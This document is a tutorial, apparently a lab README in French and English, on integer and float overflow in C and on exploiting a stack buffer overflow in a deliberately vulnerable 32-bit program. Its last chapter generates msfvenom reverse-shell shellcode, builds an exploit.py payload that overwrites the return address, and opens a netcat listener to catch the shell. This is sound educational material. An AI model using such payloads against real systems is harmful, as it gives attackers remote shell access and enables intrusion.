# overflow
* Unsigned integer overflow
```
nano somme_unsigned.c
```
```
#include <stdio.h>

// Fonction qui calcule la somme de deux entiers non signés
unsigned int somme_unsigned(unsigned int a, unsigned int b) {
    return a + b;
}

int main() {
    unsigned int num1, num2, result;

    // Demande des valeurs à l'utilisateur
    printf("Entrez le premier entier non signé : ");
    scanf("%u", &num1);

    printf("Entrez le deuxième entier non signé : ");
    scanf("%u", &num2);

    // Calcul de la somme
    result = somme_unsigned(num1, num2);

    // Affichage du résultat
    printf("La somme de %u et %u est : %u\n", num1, num2, result);

    return 0;
}

```
```
gcc -o somme_unsigned somme_unsigned.c
```
```
chmod +x somme_unsigned
```
```
./somme_unsigned
```
Entrez le premier entier non signé : 25 </br>
Entrez le deuxième entier non signé : 75 </br>
La somme de 25 et 75 est : 100 </br>
```
rm -rf somme*
```

* Patched unsigned int
```
nano somme_unsigned.c
```

```
#include <stdio.h>
#include <stdbool.h>

// Fonction pour calculer la somme avec détection d'overflow
bool somme_unsigned(unsigned int a, unsigned int b, unsigned int *result) {
    *result = a + b;
    // Détection d'overflow : si le résultat est inférieur à l'un des opérandes
    if (*result < a || *result < b) {
        return false; // Overflow détecté
    }
    return true; // Pas d'overflow
}

int main() {
    unsigned int num1, num2, result;

    // Demande des valeurs à l'utilisateur
    printf("Entrez le premier entier non signé : ");
    scanf("%u", &num1);

    printf("Entrez le deuxième entier non signé : ");
    scanf("%u", &num2);

    // Calcul de la somme avec vérification d'overflow
    if (somme_unsigned(num1, num2, &result)) {
        printf("La somme de %u et %u est : %u\n", num1, num2, result);
    } else {
        printf("Erreur : Overflow détecté lors de la somme de %u et %u !\n", num1, num2);
    }

    return 0;
}
```
```
gcc -o somme_unsigned somme_unsigned.c
```
```
chmod +x somme_unsigned
```
```
./somme_unsigned
```
Entrez le premier entier non signé : 4294967295 </br>
Entrez le deuxième entier non signé : 1 </br>
Erreur : Overflow détecté lors de la somme de 4294967295 et 1 ! </br>

```
rm -rf somme*
```

* Signed somme_signed
```
nano somme_signed.c
```
```
#include <stdio.h>

// Fonction qui calcule la somme de deux entiers signés
int somme_signed(int a, int b) {
    return a + b;
}

int main() {
    int num1, num2, result;

    // Demande des valeurs à l'utilisateur
    printf("Entrez le premier entier : ");
    scanf("%d", &num1);

    printf("Entrez le deuxième entier : ");
    scanf("%d", &num2);

    // Calcul de la somme
    result = somme_signed(num1, num2);

    // Affichage du résultat
    printf("La somme de %d et %d est : %d\n", num1, num2, result);

    return 0;
}
```
```
gcc -o somme_signed somme_signed.c
```
```
chmod +x somme_signed
```
```
./somme_signed
```
```
rm -rf somme*
```



* patched somme_signed

Overflow positif : </br>
Si a > 0, b > 0 et le résultat (a + b) est négatif, cela indique un dépassement de la capacité maximale des entiers (INT_MAX).  </br> </br>

Underflow négatif :  </br>
Si a < 0, b < 0 et le résultat (a + b) est positif, cela indique un dépassement de la capacité minimale des entiers (INT_MIN).  </br> </br>

```
nano somme_signed.c
```
```
#include <stdio.h>
#include <stdbool.h>
#include <limits.h>

// Fonction pour calculer la somme d'entiers signés avec détection d'overflow
bool somme_signed(int a, int b, int *result) {
    *result = a + b;

    // Détection d'overflow
    if ((a > 0 && b > 0 && *result < 0)) {
        return false; // Overflow positif
    }

    // Détection d'underflow
    if ((a < 0 && b < 0 && *result > 0)) {
        return false; // Underflow négatif
    }

    return true; // Pas d'overflow ni d'underflow
}

int main() {
    int num1, num2, result;

    // Demande des valeurs à l'utilisateur
    printf("Entrez le premier entier signé : ");
    scanf("%d", &num1);

    printf("Entrez le deuxième entier signé : ");
    scanf("%d", &num2);

    // Calcul de la somme avec vérification d'overflow/underflow
    if (somme_signed(num1, num2, &result)) {
        printf("La somme de %d et %d est : %d\n", num1, num2, result);
    } else {
        printf("Erreur : Overflow ou underflow détecté lors de la somme de %d et %d !\n", num1, num2);
    }

    return 0;
}
```
```
gcc -o somme_signed somme_signed.c
```
```
chmod +x somme_signed
```
```
./somme_signed
```
```
rm -rf somme_signed
```

* overflow float
```
nano float_overflow.c
```
```
#include <stdio.h>
#include <math.h>

int main() {
    float x;

    // Demander la valeur de x à l'utilisateur
    printf("Entrez une valeur pour x : ");
    scanf("%f", &x);

    // Vérifier si x est égal à 0.000007
    if (x == 0.000007) {  // Tolérance d'égalité pour float
        printf("OK\n");
    } else {
        printf("NON OK\n");
    }

    return 0;
}
```
```
gcc -o float_overflow float_overflow.c
```
```
chmod +x float_overflow
```
```
./float_overflow
```
```
rm -rf float_overflow
```

* overflow float_patched
```
nano float_overflow.c
```
```
#include <stdio.h>
#include <math.h>

int main() {
    float x;

    // Demander la valeur de x à l'utilisateur
    printf("Entrez une valeur pour x : ");
    scanf("%f", &x);

    // Vérifier si x est égal à 0.000007
    if (fabsf(x - 0.000007f) < 0.000001f) {  // Tolérance d'égalité pour float
        printf("OK\n");
    } else {
        printf("NON OK\n");
    }

    return 0;
}
```
```
gcc -o float_overflow float_overflow.c
```
```
chmod +x float_overflow
```
```
./float_overflow
```
Explications des modifications : </br>
Pourquoi ne pas utiliser x == 0.000007f directement ? </br></br>

En raison de la précision limitée des nombres flottants (float), les calculs peuvent entraîner des imprécisions. </br>
Par exemple, un nombre entré par l'utilisateur ou résultant d'un calcul peut ne pas être exactement égal à 0.000007 en binaire. </br>
Utilisation de fabsf() : </br></br>

La fonction fabsf() (de <math.h>) calcule la valeur absolue d'un flottant.</br>
La condition fabsf(x - 0.000007f) < 0.000001f vérifie si la différence entre x et 0.000007f est suffisamment petite (moins de 0.000001 dans cet exemple) pour être considérée comme égale. </br>
Tolérance (epsilon) : </br>

La valeur 0.000001f est utilisée comme marge d'erreur pour les comparaisons flottantes. Elle peut être ajustée en fonction de la précision requise. </br>

Entrez une valeur pour x : 0.000007 </br>
OK

Entrez une valeur pour x : 0.0000075 </br>
NON OK


```
rm -rf float_overflow
```
# OVERLFOW
```
#include <stdio.h>
#include <unistd.h>

int help() {
    system("touch pwned.txt");
}

int overflow() {
    char buffer[500];
    int userinput;
    userinput = read(0, buffer, 700);
    printf("User provided %d bytes. Buffer content is: %s\n", userinput, buffer);
    return 0;
}

int main(int argc, char * argv[]) {
    overflow();
    return 0;
}
```

# BOF (22.04 with minimal requirement)
## Chapter 1 
```
sudo su
```
```
apt install git build-essential libc6-dev gcc-multilib g++-multilib
```
```
find /usr/include -name "libc-header-start.h"
```
Installation [gdb-peda](https://github.com/apogiatzis/gdb-peda-pwndbg-gef) </br>
Non root mode
```
exit
```
```
cd ~ && git clone https://github.com/apogiatzis/gdb-peda-pwndbg-gef.git
cd ~/gdb-peda-pwndbg-gef
./install.sh
```
```
gdb-peda
```
```
./update
```
```
mkdir chapter1
```
```
cd chapter1
```
```
nano vuln.c 
```
```
#include <stdio.h>
#include <unistd.h>

int overflow() {
    char buffer[500];
    int userinput;
    userinput = read(0, buffer, 700);
    printf("User provided %d bytes. Buffer content is: %s\n", userinput, buffer);
    return 0;
}

int main(int argc, char * argv[]) {
    overflow();
    return 0;
}
```
```
gcc -g -fno-stack-protector -z execstack -no-pie -m32 -o vuln vuln.c
```
```
python3 -c 'print("A"*700)' | ./vuln
```
```
ulimit -c unlimited
```
```
python3 -c 'print("A"*700)' | ./vuln
```
```
gdb-peda -q ./vuln
```
```
disas main
```
we can see the overflow function
```
disas overflow
```
ctrl+shift+T, new terminal 2 : 
```
python3 -c 'print("A"*700)' > input.txt
```
On terminal 1 : </br>
add one breakpoint before read function : address before <read@plt>,  </br>
add one breakpoint after read function  : address after <read@plt>, </br>
add one breakpoint at retfunction  : address at ret, </br>
```
b *<address before <read@plt>>
```
```
b *< address after <read@plt>>
```
```
b *<address at ret>
```
run : 
```
run < input.txt
```
OR
```
run $(python3 -c 'print("A"*700)')
```
```
d
```
```
disas overflow
```
ADD BREAKPOINT LIKE LAST

```
x $eip
```
```
x/5i $eip
```
```
x $ebp-0x200
```
```
x $ebp-0x200
```
find input : 
```
x/4wx <use address at $ebp-0x200>
```
Majority with zero </br>
tape continue
```
c
```
Copy the output address as <input address>
```
x/4wx <input address>
```
tape continue
```
c
```
find input : 
```
x/4wx <input address>
```
``` 
x/100wx <use address at $ebp-0x200>
```
```
c
```
```
x $eip
```
```
p $esp
```
the result is  <p of esp>
```
x/4wx <p of esp>
```
```
c
```
```
exit
```
Getting pattern :: 
```
pattern_create 700 pattern.txt
```
```
gdb-peda -q ./vuln
```
```
d
```
```
run < pattern.txt
```
```
pattern_offset <@finded>
```
should be found at <@offset>
```
python3 -c 'print("A"*516+ "B"*4 + "C"*(700-516-4))' > input.txt
```
```
cat input.txt
```
```
gdb-peda -q ./vuln
```
```
run < input.txt
```
```
cd ..
```

## Chapter 2

```
mkdir chapter2
```
```
cd chapter2
```
```
nano vuln.c
```
```
#include <stdio.h>
#include <unistd.h>

int help() {
    system("touch pwned.txt");
}

int overflow() {
    char buffer[500];
    int userinput;
    userinput = read(0, buffer, 700);
    printf("User provided %d bytes. Buffer content is: %s\n", userinput, buffer);
    return 0;
}

int main(int argc, char * argv[]) {
    overflow();
    return 0;
}
```
```
gcc -g -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```
In another terminal : 
```
python3 -c 'print("A"*516+ "B"*4 + "C"*(180) > input.txt
```
In first terminal 
```
run < input.txt
```
```
p help
```
getting adress of helper : 
```
info function
```
If adress of helper is : 0x004011a9 </br>
the little endian will be : \xa9\x11\x40\x00 </br>
Generating shellcode </br>
RQ : TRANSLATE WITH YOU ADDRESS
```
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*516 + b"\xa9\x11\x40\x00" + b"C"*180)' > input.txt
```
```
run < input.txt
```
We can jump to ANY ADDESS  </br>
Generate SHELLCODEIn another terminal : 
```
python3 -c 'print("A"*516+ "B"*4 + "C"*(180) > input.txt
```
In first terminal 
```
run < input.txt
```
x/230wx $esp-0x250
Find where our payload START, where it begin 0x414141 </br></br>
0xbfffed60:  0x00403eec   0xb7ffeba0   0xbfffefa8   0xb7c53fe5 </br>
0xbfffed70:  0xb7e1eda0   0x00402018   0xb7ffa020   0xbfffed94 </br>
0xbfffed90:  0x00402018   0x000002bc   0xbfffeda8   0x00000000 </br>
0xbfffeda0:  0x00000000   0x41414141   0x41414141   0x41414141 </br>
0xbfffedb0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffedc0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffedd0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffede0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffedf0:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee00:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee10:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee20:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee30:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee40:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee50:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
0xbfffee60:  0x41414141   0x41414141   0x41414141   0x41414141 </br>
So address is : 0xbfffeda8 </br>
\xbf\xff\xed\xa8 </br> </br>
Find adress by </br></br>
Installing metasploit [ubuntu22.04](https://www.howtoforge.com/how-to-install-metasploit-framework-on-ubuntu-22-04/) [ubuntu20.04](https://www.howtoforge.com/how-to-install-metasploit-framework-on-ubuntu-20-04/)
```
apt update
```
```
apt install wget curl nano ufw software-properties-common dirmngr apt-transport-https gnupg2 ca-certificates lsb-release ubuntu-keyring unzip ruby ruby-full -y
```
```
apt install -y nmap
```
```
gem install bundler
```
```
bundle install
```
```
bundle update
```
```
bundle install rex-text
```

```
mkdir msf-install && cd ./msf-install
```
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
```
```
 chmod 755 msfinstall
```
```
 sudo ./msfinstall
```
```
msfconsole
```
tape ctrl+x
```
msfupdate
```
```
cd /opt/metasploit-framework/embedded/framework/tools/exploit
```
```
sudo ln -s $(pwd)/pattern_create.rb /usr/local/bin/msf-pattern_create
```
sudo ln -s /opt/metasploit-framework/bin/msf-pattern_create /usr/local/bin/msf-pattern_create
```
```
ip a
```
eg : 192.168.29.152
```
msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.29.152 lport=9001 -b "\x00" -f python
```
in the location create exploit.py
```
import sys

buf = b""
buf += b"\xbb\x5a\x58\x9f\x0b\xcc\xd9\xd7\x24\xf4\x58"
buf += b"\x2b\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03"
buf += b"\x5c\xc5\xde\x81\x5e\xc1\x9d\x8a\xbf\xa9\x06"
buf += b"\xeb\xf2\xac\x36\x2b\x60\x1e\x15\x9f\xe2\x72"
buf += b"\x99\x54\xa6\x66\x2d\xdc\x6d\x4d\x2c\xd6\xfc"
buf += b"\xc2\x0d\x4a\x3c\x5a\x5e\x9f\x3f\x9b\xa3\x52"
buf += b"\x6d\xda\xe0\x87\x86\x8e\xb9\x5f\xb7\x3f\xc9"
buf += b"\x1a\xb5\xb4\x81\x3b\xde\x18\x39\xf8\x5d\x6a"
buf += b"\x52\xe3\x80\x9a\x8c\xcd\xc8\x23\xd9\xef\x01"
buf += b"\xdf\xd5\x9c\x2c\x96\x27\x7d\x81\xa6\xe4\xff"
buf += b"\xd0\x71\x45\xff\x77\xfb\xed\x2b\x89\x28\xfd"
buf += b"\x9f\x1d\x43\xa5\xb4\xa2\x80\xde\xc3\x26\x27"
buf += b"\x12\x42\x1c\x63\x36\x47\xc3\x08\x42\xcc\xe2"
buf += b"\xde\xc2\x96\xc0\x7a\x8e\x4d\x68\xda\x6e\x22"
buf += b"\x97\x3c\xcf\x9b\x32\x36\xe2\xc8\x4e\x15\xeb"
buf += b"\x1e\xda\xa5\x64\x15\x4d\xd6\x56\xba\xe5\x70"
buf += b"\xdb\x33\xc0\x87\xc3\x43\x3f\x18\x30\x6c\xb8"
buf += b"\x89\x7f\x28\xe8\xa1\x56\x51\x63\x31\x56\x84"

payload = b"\x90" * 16 + buf + b"A" * (500-len(buf)) + b"\xa8\xed\xff\xbf" + b"C" * 180
sys.stdout.buffer.write(payload)
```
```
python3 exploit.py > payload.txt
```
Run in another terminal
```
nc -lvnp 9001
```
In the first terminal
```
run < payload.txt
```




